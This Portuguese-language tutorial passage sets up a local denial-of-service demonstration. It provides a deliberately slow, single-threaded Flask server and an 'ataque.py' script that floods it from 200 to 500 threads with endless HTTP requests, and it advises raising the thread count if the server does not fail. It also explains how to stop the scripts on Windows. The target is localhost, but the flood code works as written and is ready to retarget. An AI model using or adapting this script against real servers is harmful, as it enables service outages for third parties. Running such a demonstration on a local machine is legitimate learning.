### Como parar o ataque no Windows
Existem três formas de encerrar os scripts:

* **No Terminal:** Clique na janela do prompt onde o `ataque.py` está rodando e aperte **Ctrl + C**. (Às vezes precisa apertar várias vezes porque as threads ficam tentando abrir novas conexões).
* **Fechar a Janela:** Simplesmente feche o Prompt de Comando ou o PowerShell onde o script está rodando.
* **Pelo Gerenciador de Tarefas:** 1. Aperte `Ctrl + Shift + Esc`.
    2. Vá na aba **Processos**.
    3. Procure por **Python** (ou "Python Launcher").
    4. Clique com o botão direito e selecione **Finalizar Tarefa**.

#### Servidor (`servidor.py`)
Vamos simular que o servidor precisa fazer um esforço real. Adicione um pequeno `sleep` para simular processamento de banco de dados:

```python
from flask import Flask
import time

app = Flask(__name__)

@app.route('/')
def home():
    time.sleep(0.5) # Isso vai "segurar" a conexão por meio segundo
    return "<h1>Servidor Sob Carga</h1>"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, threaded=False) # 'threaded=False' faz ele processar um por um
```

#### Atacante (`ataque.py`)
A biblioteca `requests` é lenta para ataques porque ela espera a resposta completa. Vamos aumentar o número de threads para forçar o Windows a abrir muitas conexões simultâneas:

```python
import threading
import requests

target = "http://127.0.0.1:5000"

def attack():
    while True:
        try:
            # timeout=0.1 faz o script não ficar esperando a resposta do servidor
            requests.get(target, timeout=0.1)
        except:
            pass

# Aumente para 200 ou 500 threads (Cuidado: seu PC pode travar um pouco!)
for i in range(200):
    thread = threading.Thread(target=attack)
    thread.daemon = True # Faz as threads morrerem quando você fechar o script
    thread.start()

print("Ataque rodando... Tente acessar o site agora.")
while True: pass # Mantém o script principal vivo
```

### O que observar agora:
1.  Abra o terminal
2.  Inicie o `servidor.py`.
3.  Abra o navegador em `http://127.0.0.1:5000` (deve carregar em 0.5s).
4.  Abra um segundo terminal
5.  Inicie o `ataque.py`.
6.  Tente dar **F5** no navegador. Agora ele deve ficar girando o ícone de carregamento e dar erro de **"Tempo Limite Atingido"**.

**Dica de mestre:** Se ainda assim não cair, é porque seu computador é uma máquina de guerra! Tente aumentar o `range(200)` para `range(500)`. Só não esqueça de finalizar o processo pelo Gerenciador de Tarefas depois!
